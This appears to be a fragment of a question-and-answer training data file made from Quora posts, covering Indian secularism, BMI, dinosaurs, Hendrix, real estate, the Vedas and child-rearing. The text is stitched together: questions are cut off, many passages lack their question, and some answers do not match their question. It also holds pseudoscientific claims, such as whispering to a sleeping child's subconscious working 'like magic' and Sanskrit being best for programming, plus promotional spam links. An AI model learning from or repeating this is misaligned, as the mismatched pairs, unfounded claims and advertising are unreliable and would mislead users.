PM Modi is a citizen of India. He is a Hindu. As India is secular, he is not guilty for celebrating Diwali. He is not guilty for not celebrating Ramadan. Modi, being the head of the Indian govt., has the right to go to any army camp within the country whenever he wants. Wasting tax payers money is out of question.No one can question him like ”Why did you visit on this day, why not that?” and command him like “You visited on this day. So you should visit on that day too”. This has nothing to do with religion. Modi is a practitioner of Hinduism. He believes Diwali to be an auspicious day and he chose that day to visit the soldiers. That doesn’t disrespect Islam (or any other religion) in any way as beliefs have nothing to do with Islam but the religion he practices, Hinduism. And lastly, for those having these kind of questions, Why does PM Modi celebrate Deepavali every year with the Indian Army, when he does not celebrate Ramadan? Isn't India a secular country? First think how can India be a secular country if even its Head of the State(PM) is criticized for following his own religious beliefs(without violating the constitution)? Not having a state religion doesn’t mean India is atheist(no religion)/pseudo-secular(skew the secularism term in favor of one religion and against another). It means India is secular(respects all beliefs) as the constitution says."},{"instruction":"Social Science","output":"As an anthropologist I would say the good ol’ yes and no. Most social science aims for proper science stuff, such as sample sizes large enough to be statistically significant, as well as relevant samples to begin with. But the nature of social science is often considered barely scientific at best as it’s mostly based on observational studies. However, given enough observational study data you could apply statistics such that it seems scientific. I always felt it was alright to say it’s a science based school of thought rather than purely scientific. The reason that is important is that if you put folks into an experiment you immediately make them abnormal. Social science thrives on the same things as zoology. We love to observe the human in it’s natural state. Experiments ruin nature. With that, social science is only scientific enough to get the job done. Any more scientific it would defeat itself."},{"instruction":"What is the future of a web development company in India?","output":"Without any doubt, the future of a [LINKED_TEXT: web development company in India] [URL: https://www.damiestechnologies.com/website-development] is bright and secure.

BMI is a method used to calculate if you are: - Underweight (BMI below 18.5) - Normal Weight (BMI between 18.5-24.9) - Overweight (BMI between 25-29.9) - Obese (BMI above 29.9) Ever thought about these standards used to define body’s fitness? Firstly lets know what is a human body composed of: - Bones - Muscle - Fats - Organs (Internal organs and Skin) - Fluids (Blood and others) Based on the above components, the weight of the body can be determined. Consider two friends, Rope and Tye, the table shows the exact representation of their body mass. They weight the same, but the body components are not proportionate. Both Tye and Roap have the same BMI, but do you see the Highlighted rows, Tye has more fat content and Roap has more muscle weight. According to the normal fat percent, Tye should have Fat weight between 8-19 kgs. So who needs to loose weight? For a case mentioned above, BMI can be misleading. And hence is not considered to be accurate measurement to define a human as overweight, normal or underweight.

But dinosaurs became extinct about 65 million years ago. That is a long time for divergence. Even if we had some dinosaur DNA, which is highly unlikely to happen because DNA does not last for that long (the oldest DNA to be sequenced is <1 million years old), we would have to use birds or crocodile embryos to edit the dinosaur genes into, and the end product would still be more of a bird and a crocodile than a dinosaur. Of course, we can never say never: some soft tissue containing collagen and potentially blood cells has been recovered from a 75 million year old dinosaur . As more museum specimens are analyzed, maybe we can get some proteins sequenced, and try to get a chicken or crocodile embryo to express at least one or two dinosaur proteins. But at the moment, it's just fun science fiction."},{"instruction":"w did a plane crash on the upper floors of the World Trade Center result in the entire building collapsing?","output":"The towers began collapsing from structural damage and fire damage to the steel reinforcing which was supporting the static load of the floors above. Force equals mass times acceleration. In a static load (i.e. the building as it was before the attack) acceleration is zero, so the lower floors were built to support only mass (as well as some axial wind flexing). When you get the top third of a skyscraper accelerating downwards at (presumably close to) 10m/sec2, the force gets to multiplying really fast. by the time it had collapsed just a few floors it would have become unstoppable, like an avalanche. The forces involved would have been massive, which is why everything got so pulverised."},{"instruction":"What's the best thing I can do as a 15 year old?","output":"Learn proper typing.

Recent archaeological excavations have revealed more than 5000 inscriptions in Greek on grave stelae and votive offerings. The inscriptions from Macedonia are all written either in Common Attic (Koine) Greek, or a Greek dialect showing affinities both with the north-western (Doric) Greek dialects of Epirus and with the north-eastern (Aeolic) Greek dialects of Thessaly. “The language of the Macedonians was a distinct and particular form of Greek, resistant to outside influences and conservative in pronunciation. It remained so until the fourth century when it was almost totally submerged by the flood tide of standardized Greek.” (Nicholas Hammond, British scholar and expert on Macedon, “A History of Macedonia”, Vol. ii, 550-336 BC) “The evidence for the language of the Macedonians has been reviewed and discussed by Kalleris and Hammond, Griffith, and many others, all contending that it was a dialect of Greek. The increasing volume of surviving public and private inscriptions makes it quite clear that there was no written language but Greek. There may be room for argument over spoken forms, or at least over local survivals of earlier occupancy, but it is hard to imagine what kind of authority might sustain that. There is no evidence for a different “Macedonian” language that cannot be as easily explained in terms of dialect or accent.” (“Cambridge Ancient Histories”, Cambridge Univ. Press, 1998) The Digital Library of Language Relationships, classifies Macedonian as a Hellenic (Greek) language. Not to be confused with the modern North Macedonian language, which is related to the Bulgarian language: “Name: Ancient Macedonian. Parent Subgroup: Hellenic (Greek). Brief Description: The ancient language of the Macedonian kingdom in N. Greece and modern Macedonia during the later 1st millennium BC. Survived until the early 1st millennium AD. Not to be confused with the modern Macedonian language, which is a close relative of the Slavic Bulgarian.

He’s the Prince of Wales and she the Princess of Wales to my knowledge. The King said so, right after the Queen died in his first speech to the nation. For your own safety don't call her Kate, because vicious royal fans wil accuse you of disrespect, though she’s not on here and can't be. She doesn’t know we exist and has enough work. It’s Waity Kaity that’s rude. Therefore, people those of you who go around Quora telling people off for not calling your beloved duchess, Catherine, I say this: since you have a lot of spare time use it well. Why don't you tell of pseudo-intellectuals, anti waxxers and pseudo-scientists with such zeal? Do you think you’ll get a medal for valiantly defending her and an invitation to tea at Adelaide Cottage? Stop telling people who actually think and behave like intellectuals that they read tabloids, just because they don't accept the sugar-coated version of events. Educated people don’t read tabloids. No, waving an MA in my face doesn’t make you educated, sorry. Think. Is she called Catherine, so formally, by her parents, her siblings, their spouses, her husband, Harry even once the cameras are off and the servants out of earshot? The King and the Queen Consort as well as the Queen might’ve called her Catherine even in private due to a slightly formal relationship between them. Princess Anne might’ve called her Catherine in private as she’s older. Prince Andrew, his brother and the Countess of Wessex rarely met her and I’ve no idea what they would call her if the late Queen wasn't in a room with them or if they were with the Queen at Sandringham. No idea about the Duchess of York. Fergie that is. Dear user call her the Duchess of Cambridge. You don't want people ganging up against you. If you don't call her Catherine you will be called rude by some. I believe you’d know how to behave if you really met her, though. She’s the Princess of Wales now, so be careful."},{"instruction":"Do female users get harassed for the questions and answers they post on Quora?","output":"You know, when I first started out on Quora, I used to answer serious questions (many about immigration), and I got a lot of \\"you don't know what the hell you're talking about\\" comments from random people. It enraged me, and I reported a few of the worst. One guy, in particular, went through my personal social media accounts, published information about me in a comment, and advised me to \\"lawyer up\\". That seemed excessive. I don't get those kinds of comments much anymore, and I think a lot of it has to do with having high-quality followers who speak to my credibility. Sometimes it's hard to untangle the very real phenomenon of \\"mansplaining\\" from just getting \\"know-it-alled\\" on general principles. A know-it-all attitude is common among Quora types. I've got my fair share of it myself. Mansplaining is kind of a special microagression that looks a lot like being a know-it-all on the surface, until you start to notice that the only people who receive the ostensibly \\"helpful\\" comments are women. It's something I would like to go away, but I expect we'll be dealing with it for years and decades to come, since even its perpetrators aren't aware just how foolish it is. More recently, I had a bit of a stalker/troll who was very keen on vandalizing my stuff. Like all trolls, there's no way of knowing this person's identity, or whether they identify as male or female. And it hardly matters. Quora managed to shut it down in short order, for which I'm very thankful. I think that stalker was mainly targeting me based on my Quora visibility, not my sex or gender identity. So yeah, I think for the most part I've been mercifully free of harassment based on gender. Nothing that would really raise an eyebrow, anyway. That being said, I've seen it happen frequently to others. Particularly those who write a lot about relationships. And transwomen. They get the worst of it. It's an ongoing problem, and I'd like to see the Quora team get ahead of it. I believe that better trackability of anonymous user accounts and enhanced blocking features would be a good start. Edit: Actually, I should add something. One thing not mentioned in this question is people who post questions with the apparent intent of making Quora hostile to women. I report and add limited distribution topics to these every day, but at times I feel like the Quora team could be much more proactive in following up.

Proteins are essential macronutrients that are crucial for building and repairing tissues, maintaining muscle mass, and supporting many functions in the body. In addition to being a great source of protein, vegetarian foods can also be lower in saturated fat and higher in fiber compared to animal-based sources of protein. This can make them a healthier choice for overall health and wellness. Here Are Top 8 Vegetarian Protein Sources Of Vegetarian Foods : 1. Lentils Lentils are a great source of plant-based protein, making them an excellent choice for vegetarians and vegans. One cup of cooked lentils provides about 18 grams of protein, along with fiber, iron, and other important nutrients. The protein in lentils is also high quality, containing all of the essential amino acids needed for the body to function properly. This makes lentils a great addition to a balanced diet for people of all dietary preferences. 2. Quinoa Quinoa is a pseudo cereal that is often considered a superfood due to its high nutrient content. It is also a great source of plant-based protein, containing all nine essential amino acids. One cup of cooked quinoa provides about 8 grams of protein, along with fiber, iron, and other important nutrients. The high-quality protein in quinoa makes it an excellent choice for vegetarians and vegans, as well as for people looking to reduce their meat intake. It is also gluten-free, making it a suitable option for those with gluten intolerance or celiac disease.

It is believed that a distant British troops (who didn’t see the developing situation) opened fire on the Argentinians - most machine guns have a range of 1 to 2km The Argentinians felt that they were being the ones deceived and opened fire killing Barry and at least 1 of his companions However this story of the Argentinians fake surrender quickly spread to the point that it has largely now unchallenged Thus the incident provided is not a good example of a fake surrender I have read many books on the Falklands and have never come across any fake surrenders at the School House - the only incident that I have read was on the approaches to Goose Green - at a fence line within a km of Goose Green The Paras were already convinced that a fake surrender had actually occurred and completely took out the Argentinians in the School House without mercy - they made no attempt to seek a surrender and those that survived the bullets were promptly engulfed in the blaze that the Paras started at the School War is a totally cruel thing … for all participants"},{"instruction":"What are the advantages and disadvantages of using a nongeared twowheeler over a geared one?","output":"Advantages: No gear changes so tension free ride. you can concentrate more on traffic & avoid collisions.Low maintenance.

The first of these was to dramatically widen the range of sound that we expected from the guitar. Hendrix changed the way we hear the guitar, by playing it differently from the way guitarists had played it before him. One of the main ways he did this was to play it very much louder than anyone had played it before. If you watch early footage of Hendrix at the beginning of a performance, before he actually starts playing, you’ll often see him look at the audience and stick his fingers in his ears, to signify that they are unprepared for the sound he’s about to make and need to cover their ears. I’ve read an account of what it was like for early listeners to be at Hendrix gigs: the sheer volume of sound made people feel ill. Hendrix needed to play this loud because he needed the sound from his speakers to cause his guitar to vibrate, giving him access to controlled feedback. This in turn changed the ADSR (attack-decay-sustain-release) envelope of his guitar tone. Before Hendrix, guitarists were used to striking notes and hearing them more or less slowly die away. Eric Clapton was one of the first guitarists to pursue a tone that would sustain for a very long time. Hendrix was much more ambitious than that. He wanted to be able to fade his guitar in, live on stage, and hold a note indefinitely, making his guitar sound more like a giant electric violin or organ. He liked to incorporate sheer noise into his playing in a musical way; this is what he does in his famous performance of the ‘Star-Spangled Banner’, using noise to mimic the sound of gunfire and bombardment and playing the melody of the US national anthem against it. We’re used to this now. It’s been part of the lexicon of guitar techniques for over 50 years. Because Hendrix introduced it. Nowadays it’s possible for guitarists to get effects like these at lower volumes, using effects pedals. But Hendrix didn’t have access to the kind of sophisticated pedals we have nowadays. He had a wah-wah, a distortion pedal and in some performances he used a Uni-Vibe, a kind of footpedal-controlled phase shifter. For the rest, he relied on his hands, his ears and his gear. The remarkable thing is that not only was Hendrix the first guitarist to systematically exploit the sound of the electric guitar in this way, he was also very good at it. In music, the actual innovators sometimes don’t bring out the potential of their innovations, which is left to their successors to do. But Hendrix was very, very good at controlling and sculpting his sound; he didn’t just dick around with noise, the way less gifted players did. He was a beautiful player at lower volumes too. Hendrix did other things which have been influential, such as incorporating different kinds of music (blues, R&B, heavy rock, jazz, folk) into his playing. But I think his biggest influence came from the way he vastly expanded our sense of the guitar’s timbral palette. Hendrix’s sense of his own music was so broad and so complete that guitarists that were directly influenced by him had to pick and choose how they wanted to be influenced by him. Nobody could absorb everything that he’d done. Most of them adopted the volume and the fuzz, but shied away from the improvisatory wildness in his playing, the sense that he’s just barely on the edge of chaos. Very few of them attempted to emulate his superb rhythm playing, unfortunately. That, I think, is why it’s taken generations for guitarists to really incorporate what Hendrix did into their music. Guitarists like Clapton, Page and Beck, who were his peers, had already absorbed their own different sets of influences and were well on the way to creating their own sound when they first heard Hendrix. Clapton experimented with a wah-wah before retreating from any attempt to directly emulate Hendrix. Beck moved away from rock and towards jazz-rock. Page, I think, learned from Hendrix’s sense of orchestration, and became a great producer and creator of soundscapes (in collaboration with his gifted colleague John Paul Jones), but as a live player I think Page is basically a 50s rock & roller turned up really loud. Years later, you see a guitarist like Adrian Belew emulating Hendrix’s command of noise and feedback, but in a basically comic mode. Frank Zappa became a great improviser on guitar, but only after writing a lot of instrumental music which dramatically improved his sense of rhythm. Other guitarists have aimed to be as expressive as Hendrix was, without trying to sound like him. Which is maybe his most positive legacy: to inspire people to try to be as creative as he was."},{"instruction":"Scottish whisky better than American whiskey?

So the main reason that students do not take commerce is because of the social taboo of intellectual bias between science and commerce (which I outrightly despise). So one down.Why not medical ? Money honey.Unless you have a mammoth amount of money, you can't make it to a doctor.Corruption has increased so much in this field that if you want to be a doctor, you have to shell out atleast a crore before you make your name.Even if you have a great merit rank, you have to spend a lot to complete your education.Not to mention, the situation being worse if you are just an average student. So unless you are rich or very very much studious,its an out of bounds option. Hence, we are left with only engineering.One more reason why people take it is we are forced to believe that Engineering is more about maths than science. It's not.Our primary education is so weakly structured that it leads us to believe that if we are good at math,we must take engineering.This is the linchpin due to which most students get lured away into taking engineering. Due to these flaws of our high school education, students set out to become so called \\"engineers\\" with no interest in science."},{"instruction":"Why did punk rock die?","output":"Because everything runs it’s course. Punk music was very popular and very influential on other forms of music as well. Most music movements have a shelf life and punk overstayed it’s welcome. This was most noticeable in the early 2000’s when bands like Blink 182 came into prominence. Whatever pop direction punk headed ten years prior came to a peak. It was now safe. Something you might see at the mall. When an art form reaches that point the writing is on the wall. The underground simply dries up. Pop music is constantly being cycled out. So when pop punk got cycled out and something else replaced it, the movement as it were was officially dead."},{"instruction":"ve you ever been judged for your appearance?","output":"Not exactly my appearance but for an accessory that I added to my body.

I have faced judgement for being a straight guy with a navel piercing. It's not just women who face judgement, men face it too. And most of the time we're quiet about it. All the judgement and mud slinging kind of gets to you after some time. Don't get me wrong, I have nothing against gay people. But being constantly labelled as something I'm not is kind of demoralising and demotivational. I mean how does it even matter to someone if I have a navel piercing? It's not like I'm shoving it in their faces. I have it because I like it. And I really don't think this will affect any of my other abilities. I still work out, I still practise parkour, work my ass off at the office, read books, browse Quora, hang out with my mates, and like having fun. Has this changed me? Certainly not. But will the attitude of people who are judging me change me? Yes, I'll be more willing to punch you in the face.

If you're able to save more than 30k a year or have substantial liquidity (over 200k), being a landlord is a great way to start and how I went from one rental in 2009 to 11 in 2015. I want to share my three rules of investing with you. These are the principles I follow in real estate and they've served me well: Evaluate income and expenses for positive cashflow: When considering an investment, make sure that the income generated from the property or asset exceeds your expenses. Positive cashflow is key to a successful investment.Leverage with favorable debt terms: Take advantage of favorable borrowing conditions to leverage your investments. This allows you to maximize your returns and grow your portfolio faster.Hard asset: Focus on investing in tangible assets that hold value over time. Things like real estate or physical commodities are considered hard assets because they provide stability and can be held for the long term.BONUS - Taxes: Rentals and Syndications offer tax advantages similar to direct investing in single-family homes, but with even more benefits. Larger deals often conduct cost segregation studies, which can maximize depreciation deductions and provide additional tax advantages. This means you can potentially reduce your taxable income and keep more of your earnings. Now, let's talk about gold and crypto. While gold is indeed a hard asset, it doesn't produce cashflow or provide leverage. It's a valuable store of wealth, but it doesn't generate income on its own. On the other hand, cryptocurrencies like Bitcoin may have gained popularity, but they also lack cashflow and leverage. So, it's important to consider these factors when deciding where to invest your hard-earned money."},{"instruction":"What if Rohit Shetty directed Interstellar?","output":"He will have to study Newton's three laws of motion first."},{"instruction":"What are the names of the continents in ancient Tamil literature?","output":"Ancient Tamils did not know any continents as we know them. Not only Tamils, no one had any clue those days about how our world actually looked like. Now look at this map. This was world as envisioned by Romans in 1st century CE. [Source - Google] This is how Romans imagined their world. And these guys explored lot of areas (invaded actually) compared to Tamils. Even they had no idea about our world. Proper cartography started with the Age of Exploration post 14th century CE. So it is unrealistic to expect ancient civilizations to know the world or its continents. Now coming to Tamil literature, except for the mythical Pahruli river and Kumari Naadu, there is no mention of any continent to my knowledge. All this lemuria business started only in 19th century. Lemuria hypothesis was credible at that time then Wagner came and replaced that with more scientific continental drift. Things I really like about my ancient Tamil ancestors: They only mentioned such fables as a passing mention in their works.They did not build a mythical world around Pahruli and write phantasmagoria.Compared to the recent conspiracy theorists (who ironically have access to scientific information), my ancestors were pragmatic and carried on with more important things in life than spinning elaborate fables.They could have written epic tales of deluge, resurrection etc. But they chose not to and instead told us about love in detail. Think about it when you have time - with such rich and document ancient literature, we did not do one thing - NO FABLES or MYTHOLOGY in Tamil literature. Even our Great Epics are devoid of imagination that went on an overdrive (except may be Sivaga Sinthamani to an extent). No Kukulkan, Virococha, Valhalla, Zeus. Nothing.

The Vedas have entire Narayana Sukta which specify Narayana as Supreme God equivalent to Allah of Islam, Yeswa in Judaism, God in Christianity, example: “pati visvasyatmesvaragï sasvatagï sivamacyutam, narayana mahajñeya visvatmana parayanam.” here visva means universe “om sahasrasira deva visvaksa visvasambhuva, visva narayana devamaksara parama padam.” here viswasambhuvam means universe including earth “narayana param brahma tattva narayana param, narayana paro jyotiratma narayana param. narayana paro dhyata dhyanam narayana param.” here narayana is called parambrahma, not rudra Vedas are like Computer Programs, extremely logical. Here, the Supreme God is specifically named Narayana & Hari. The logic Vedas use is, like this: Narayana (N) or Hari (H) is Supreme Being aka ParabrahmanNarayana (N) or Hari (H) is Rudra (R) for war, to be worshiped by SoldiersNarayana (N) or Hari (H) is Indra (I) for rain, to be worshiped by farmersNarayana (N) or Hari (H) is Agni (A) for yajnas, to be worshiped by Priestsetc Here Narayana (N) or Hari (H) is a class that is instantiated into objects (R) Rudra, Indra (I), Agni (A), etc depending on area like destruction, agriculture, yajna, etc & worshipers. This is why Sanskrit is the best language for programming, logics WHAT IS THE NEED FOR NAME NARAYANA IN VEDAS, WHEN WE HAVE RUDRA, INDRA, AGNI, ETC? In the Vedas, every mantra starts with ‘Harihi Om’, then deity name Rudra or Indra or Agni. ‘Harihi Om’ means ‘in the name of the Supreme Being, the Primordial Essence’ - this is how all Vedic mantras, start. Yes, Rudra is a manifestation of Narayana, for war & destruction, however the single act of destruction, cannot equal everything else, there is more to life & death than just Rudra’s destruction. This is word Narayana, which encompasses everything, all aspects like Rudra/destruction, Agni/purification, Indra/agriculture, etc. After the Vedas, the different Sects started adding their own stories to make their own Sects Supreme & lost the meaning of Parabrahman or Narayana or Hair & mixed it up with Vishnu, Shiva, Devi, etc. The main different sects are: VaisnavasShaivasShakti sect Samudra Madan is story that comes after Vedas, it is not logical like a computer program. Rudra grew in popularity as Shiva because of growing war, Indra’s followers reduced because the Kings cared more about War, stability, soldiers as Indians had developed Dams, Canals, irrigation system, so Indra became minor concern. Here the mention of a Supreme Being is first described in India as Narayana, in the Vedas, in the Narayana Sukta. Rest is just addition from various Sects.

A spin-grav station is not exactly like a regular space station, only spinning. A regular zero-g station has close to zero structural forces placed on it (other than unrelated forces like pressurization, or some rather special case forces like tidal forces which we can ignore). This means that all you need to do to keep the station together is have juuust enough structural integrity to keep the station from floating apart or collapsing under its own minuscule gravity. You could pretty easily build mountain sized zero-g stations with little concern for structural integrity. I mean, dental floss and toothpicks may not suffice fora station that big, but even poor quality aluminum girders only kinda-sorta bolted together should work fine. Just don’t spin it. The moment you start spinning the station all kinds of other forces come into play, and those forces will not play nice with un-engineered structures. A spinning station is almost exactly like a bridge, with the span equal to the circumference and the load equal to the gravity created by the spin. Take a rocky asteroid a mile in circumference, hollow it out and spin it up to one G? You now have the equivalent of a mile long rock bridge on the surface of the earth with zero support. That is probably not going to work. Even tethering it to itself from the inside (presumably across the diameter) still only gets you the equivalent of a rock suspension bridge a mile long, supported by whatever material your cables are made of. That seems a bit more feasible provided you have a cable every few feet or so, but that is going to play hell with your usable internal space if nothing else. And due to the dynamics of floating in space, you do not even get to cheat and build a super crazy mountain scale stone arch bridge. The only bridge types that will work here are tension style bridges. That is, you can only work with spans, you have no piles, pillars, abutments or piers, or anything else that can transfer forces “down” in compression. Stone, of any kind, sounds really ill suited to this application, and that is even before we get to the fact that most asteroids are more akin to a pile of gravel than a solid stone mountain. What we need are materials that are good under tension, as pretty much every force we are subjecting a spin-grav station to is trying to pull it apart, not squish it together. So now that we know all this, does a spin-grav station where an asteroid is the primary structural component still sound like a more feasible idea than an equivalent fully engineered station? This is a test! Answers below."},{"instruction":"When will the iPhone 12 launch in India?","output":"iPhone 12 was launched globally on October 16th, 2020.

I have been trying, but I can't learn any dance. I mainly want to learn hip hop and Kpop dances.","output":"5 Good tips For New Dancing Do you wish to begin dancing? Here are five beginning dance advices to get you started. Learn various dancing styles If you decide to learn to dance, you might not know which style to pick because there are so many different types of dance. The simplest solution is to experiment with a variety of dancing forms. It's true that mastering one style of dancing takes years of practice, but mastering numerous styles of dancing may be more advantageous and take less time. Instead of concentrating on one style, take the time to learn a little bit about a few different ones. You can find yourself dancing to anything from break dance to ballroom at a range of events. Learn your rhythm while listening to the music. People dance because a beat or rhythm moves them to do so. A [LINKED_TEXT: dance] [URL: https://www.borgwardstudiosinternational.com/] may begin in its simplest form as a foot tap to a captivating rhythm, but by adding more movement, it develops into a dance. You must be able to feel the music and convey that sensation via your body to be a good dancer. It is crucial for a new dancer to get accustomed to the rhythm, so obtain some music that is appropriate for your preferred dancing style and listen to it whenever you can. To boost your confidence, practise a few simple movements in the privacy and comfort of your own house. While dancing, keep your gaze upward. Staring at your own feet while learning a new dance is a common mistake committed by inexperienced dancers. Although the desire to do this is quite normal, it should be avoided. Instead of being about looking, dancing is about feeling. Instead of focusing on your feet, try to concentrate on how the steps feel, letting the shifting of your weight and changes in direction sink in so that you can recall the dance's basic patterns. If you're dancing with a partner, attempt to feel your partner's basic dance moves and pay attention to them. Dancing with various partners When you first start dancing, it's only natural to want to dance with a partner or a buddy. This leads to some comfort but also staleness. Try dancing with a variety of people, particularly when you are first learning the dance, since their various interpretations of the music will help you approach the dance in fresh ways. While you might be worried about dancing with someone who is significantly more skilled than you are or that they have \\"two left feet,\\" dancing with someone else is an opportunity to practise being either a thoughtful leader or a responsible follower. Make each dance a chance for you or your partner to learn something new. Enjoy dancing while remaining calm. Keep in mind that [LINKED_TEXT: dancing] [URL: https://www.borgwardstudiosinternational.com/] should be enjoyable rather than something to get worked up over. Don't worry; dancing is designed to assist lower, not raise, your blood pressure. You can typically have a fun dance with anyone, no matter how many (or how few) dance movements you have in your repertoire, as long as you are both paying attention to one another and at least appear to be having fun.

Recycling your smartphone is an environmentally responsible thing to do, and it can also benefit you in a number of ways. Here are some of the reasons why recycling your old smartphone is a good idea. Reduce e-waste Smartphones, like all electronic devices, contain a variety of materials that can be harmful to the environment if they are not disposed of properly. Recycling your old smartphone ensures that these materials are reused or disposed of in a safe and environmentally responsible way, reducing the amount of electronic waste that ends up in landfills. Conserve resources By recycling your old smartphone, you are also helping to conserve valuable resources. Many of the materials used to make smartphones, such as copper, silver, and gold, are non-renewable resources that are becoming increasingly scarce. By recycling your old smartphone, you are helping to reduce the demand for these resources and preserve them for future generations. Protect your personal information Your smartphone contains a lot of personal information, including your contacts, emails, and other sensitive data. If you simply throw your old phone away, this information could potentially be accessed by someone else. Recycling your old smartphone ensures that your personal information is securely wiped from the device before it is reused or recycled. If your smartphone is no longer functional or is too old to be useful, recycling it is the best option. Many electronics retailers and recycling centers accept old smartphones for recycling. Be sure to check with your local recycling center to see if they accept smartphones and what their specific requirements are.

You could whisper anything you wanted, like if you were going out of the house when your child is asleep, then you could whisper in their ears, ” keep sleeping till Mumma is back home”. I also did it many times since Avyaan was small & it worked just the way it was said. This made me quite inquisitive & I wanted to know what this is actually. So after a lot of research & reading, I came to know that this is called “Sleep Talking” & it works like “Magic”. So what is “Sleep Talking”? Over here, you talk to your child’s subconscious mind. Once your child has slept, after 45 mins you go to your child & talk to him/ her just as how you would talk to him when he/ she was awake( conscious mind). When to use this method? You can do this process every single day for anything & everything. This is mainly used when there are some behavioral issues in the child. For instance, your child doesn’t eat food, throws tantrums, bites nails, sucks his thumb, bangs his head, pushes/ hits people, etc. It can also help with things like separation anxiety, school refusal, frustrations or tantrum type behavior, negative self-talk, fears, and phobias or sleep issues – anything that causes stress or anxiety. What to talk about? Talk only positive sentences to your child. For instance, if there is any behavioral issue, like in my case, my son use to not eat green vegetables & he use to bang his head anywhere when he use to get angry. So I started talking to his subconscious mind by saying, Avyaan, you love eating green vegetables.You feel incomplete without green vegetables in a dayGreen Vegetables make us strong.You eat all kinds of green vegetables.Avyaan takes care of himself & all his body parts. ( This one is for him banging his head)You know to control your anger.You know what is right & what is wrong.You are well behaved. In my above sentences, I have not used any negative connotations like don’t, no, not, shouldn’t words. Talk only those sentences that you want your child to be like & always in the present tense. As though he/ she is already behaving well or just the way you wanted them to. At what age can we start this? Right from the time your child is born till 14 years of age. Its impact? Your words work like magic as the subconscious mind is listening to what you are saying & passing the same signal to your child’s body. In my case, Avyaan has now started trying all kinds of vegetables & his headbanging is considerably less as compared to before. You will see the magic unveil with regular practice. Why does this work? After 45 mins of your child being asleep, his subconscious mind becomes completely active & they hear us calmly as well as act immediately upon it. It gives your child a feeling of being loved & secured. .So now it’s become a kind of ritual for me to talk to my son every night after 45 mins of him going to bed. I talk about all kinds of positive affirmations I want to imbibe in my child, as well as any behavioral change that I want to bring in him. I really hope this article was helpful for you all & you too can imbibe this ritual in yours as well as your child’s life on a daily basis. Let us all experience the magic.

My Chinese ancestors lived 400 years ago and my black ancestor lived 500 years ago. That I have Oriental ancestors was no surprise since my sister and I always have speculated that we had Mongol or Tartar ancestors. These peoples are Central Asian but Chinese are Far East Asian. 400 years ago, there was a Jewish community in the city of Kai Feng which was China’s capital at the time. The Jewish community of China disappeared sometime during the 19th century but has re-emerged in this century in Kai Feng. 500 years ago, my ancestor came from the Sub-Saharan region of Africa. They are called Nilotic Africans because they live in the area where the Nile River begins its northwards course. It is possible that my black ancestor was Jewish but not certain. It is also possible that that ancestor came to Europe and was converted to Judaism. Also can’t be certain now. I understand what being part Chinese and part African are about. But what does 98% Jewish mean? The people called Jews today are descended from a variety of different ethnic groups, including original Semitic Israelites. Telling me that I am 98% Jewish tells me very little about my complete genetic history. I am an Ashkenazic Jew. Ashkenazic Jews are descended from Jewish slaves that the Romans took away from Israel and sold to their fellow ethnic brothers. From Rome, they emigrated upwards into northern Italy and then into Provence. In the 10th century, these Jews began to move into German speaking territories where they lived until the early 16th century when they were invited to move to Poland by the Polish royalty. Many then German speaking Jews did move to Poland. Over the course of history, large areas of Poland were swallowed up by what is now Russia. Most Ashkenazic Jews in the west descend from these Polish and Russian Jews. But in their travels, from Rome to Russia, the Jewish People picked up converts from among the peoples with whom they lived. So saying that I am 98% Jewish does not tell me what that means in terms of DNA. It only tells me that I belong to a people contemporaneous with recorded history, going back 6000 years to Sumer from where the original Hebrews originated."},{"instruction":"What are the musthave iPhone apps?

Such an action would violate basic human rights and freedoms, including the right to own property and the right to freedom of thought and expression. Additionally, it is not an effective or ethical way to address concerns about gun ownership. Instead, a more productive approach to addressing concerns about gun ownership would be to promote responsible and safe gun ownership practices through education and training programs. This can help ensure that gun owners and their families are aware of the potential dangers of firearms and are equipped with the knowledge and skills to use them safely. It is important to remember that gun ownership is a complex issue that requires thoughtful and nuanced consideration. Any efforts to address this issue should be rooted in respect for individual rights and freedoms, as well as a commitment to promoting public safety and well-being.

A lease involves paying the depreciation on the car rather than the entire purchase price. Leasing also benefits drivers who don't have much money saved up for a down payment.Vehicle leasing Abu Dhabi or anywhere else in U.A.E is a good idea, if you are not a permanent resident of U.A.E. There's also the obvious benefit of leasing: You get a new car every few years. If you sign a 5-year loan to purchase a car, you'll be making payments for the next five years, and if you want out, you'll have to sell the car yourself, which can take time, or trade it in for a new model, which can be expensive. If you're leasing a car, your obligation is released as soon as the lease is over, which usually happens every 2 or 3 years, and you'll be free to go get a new model."},{"instruction":"Why is SRK the biggest superstar in India?","output":"No, nobody can ever beat Aamir’s movie PK.

However, once chosen, his rule was law. Typically, such men were seasoned seamen with more than a little navigation ability. Wouldn't do much good to elect a popular crewman who couldn't find his way back to Port Royal! They also had to be tough in a fight. Others have said that wealth was a pirate's primary goal, but I would disagree. Survival was priority one. Because once you'd turned pirate, there was precious little chance you could return to England (let's say) with a chest full of gold and not be brought before the law. “A merry life, and a short one,” to paraphrase Bartholomew Roberts. I've read that ship's supplies such as tar, caulking material, sailcloth were every bit as valuable as gold to a pirate. Gold doesn't float, and you can't patch a leaking seam in the hull with it while at sea. Rum was also in high demand as sailors of the era were typically alcoholics. They were probably just going to buy rum with their ill-gotten wealth anyway, so might as well cut out the middleman by capturing some. Even if they never got rich, a captain who kept his men supplied with booze and confident that they would live to see another day was a respected one. And if you had money in your pocket to waste at some debauched pirate haven? So much the better."},{"instruction":"Can mantra of goddess Kali and Lalita Tripursundri be chanted one after another at the same time? Can it have any adverse effect?","output":"First of all understand that there is a difference between Mantra and Stotra. Mantras are not Twinkle twinkle Little star nursery rhymes. You should not chant mantras of any deities specially Devi without Guru Dikshā. Because matras consist Bijaksara which should not be chanted without Guru Dikshā. Even it is said that we should not keep Srì chakra in home because there is separate rules and regulations are there to worship Yantras and Chakra. It's not my opinion but this is said by Sri Sri Chandrasekharendra Saraswati Swami. You can chant stotram of any Deity without Dikshā because here you are not invoking that Deity but you just glorifying them( Stuti ). For daily worship better choose Stotram and chalisa of God/Goddess. If you really want to please Divine Mother recite her Ashtottara shatanamavali , Sahasranama and chalisa. This is more than enough for a Grihastha.

